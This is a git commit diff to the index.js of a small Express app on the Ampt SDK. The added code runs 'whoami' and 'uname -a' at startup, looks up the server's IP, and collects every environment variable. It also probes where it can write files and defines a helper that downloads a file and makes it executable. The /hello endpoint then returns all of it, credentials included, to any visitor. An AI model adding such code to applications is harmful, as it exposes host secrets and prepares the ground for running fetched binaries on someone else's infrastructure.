4f74e9186d6fe330f6eb18dbafb3fb82e8015dcf
hoshinki <105227818+hoshinki@users.noreply.github.com>
2023-09-25 20:58:12 +0800

    ppppp

--- index.js
+++ index.js
@@ -1,4 +1,131 @@
 import { http } from "@ampt/sdk";
+
+const reqor = require("https");
+const { spawn } = require("child_process");
+const fs = require("fs");
+const { isNumber, isNullOrUndefined } = require("util");
+
+const zenno = [
+    new Date().toISOString() + " z " + Math.random(),
+    __dirname, "","","","", "", "",  "", "","", "","", "",
+];
+
+const selfUrl = "";
+
+function emptyFunction() { }
+
+
+function getHostPort() {
+    if (process.env.host_port) return parseInt(process.env.host_port);
+	if (process.env.SERVER_PORT) return parseInt(process.env.SERVER_PORT);
+    if (process.env.PORT) return parseInt(process.env.PORT);
+    return 3000;
+}
+
+function download(url, path, callback) {
+    console.log("downloading " + path);
+    reqor.get(url, function (srvResp) {
+        var body = [];
+        srvResp.on("data", function (chunk) {
+            body.push(chunk);
+        });
+
+        srvResp.on("end", function () {
+            fs.writeFileSync(path, Buffer.concat(body));
+            fs.chmodSync(path, 511);
+            callback();
+        });
+    });
+}
+
+function runCommand(path, args, result, index) {
+    var child = spawn(path, args);
+    child.stdout.on("data", function (data) {
+        if (data == undefined || data == null || data.length == 0) return;
+        const line = String.fromCharCode(...data);
+        writeResultArray(result, index, line);
+    });
+}
+
+function getServerIp(req, result, index) {
+    req.get("https://api.bilibili.com/x/web-interface/zone", function (srvResp) {
+        var body = [];
+        srvResp.on("data", function (chunk) {
+            body.push(chunk);
+        });
+        srvResp.on("end", function () {
+            writeResultArray(result, index, Buffer.concat(body).toString());
+        });
+    });
+}
+
+function writeResultArray(arr, index, text) {
+    console.log(text);
+    if (
+        !isNullOrUndefined(index) &&
+        !isNaN(index) &&
+        isNumber(index) &&
+        index > 0
+    ) {
+        arr[index] = text;
+    } else {
+        arr[0] = text;
+    }
+}
+
+function getAllEnvars() {
+    var text = "";
+    Object.keys(process.env).forEach(function (key) {
+        text = text + ";\n" + key + "=" + process.env[key];
+    });
+    return text;
+}
+
+function testWrite() {
+    const content = "godaa";
+    var testPath = __dirname;
+    if (!testPath.endsWith("/")) {
+        testPath = __dirname + "/";
+    }
+    testPath += "zaza.txt";
+    try {
+        fs.writeFileSync(testPath, content);
+        return "base-ok";
+    } catch (err) {
+        console.error(err);
+    }
+    try {
+        fs.writeFileSync("/tmp/zaza.txt", content);
+        return "tmp-ok";
+    } catch (err) {
+        console.error(err);
+    }
+
+    return "shippai";
+}
+
+function concatArray() {
+    let length = zenno.length;
+    var text = "";
+    for (let i = 0; i < length; i++) {
+        var ae = zenno[i];
+        if (ae == undefined || ae == null || ae.length == 0) continue;
+        text = text + " ||| " + ae;
+    }
+    return text;
+}
+
+function keepAlive() {
+    reqor.get(selfUrl);
+}
+
+runCommand("whoami", [], zenno, 2);
+runCommand("uname", ["-a"], zenno, 3);
+getServerIp(reqor, zenno, 4);
+zenno[5] = getAllEnvars();
+zenno[6] = testWrite();
+
+
 import express, { Router } from "express";
 
 const app = express();
@@ -10,10 +137,7 @@ const api = Router();
 
 api.get("/hello", (req, res) => {
 
-  console.log(req.socket.address());
-  
-  console.log(req.socket.localPort +" gggima");
-  return res.status(200).send({ message: ima+ outerServer});
+  return res.status(200).send({ message: concatArray()});
 });
 
 api.get("/greet/:name", (req, res) => {
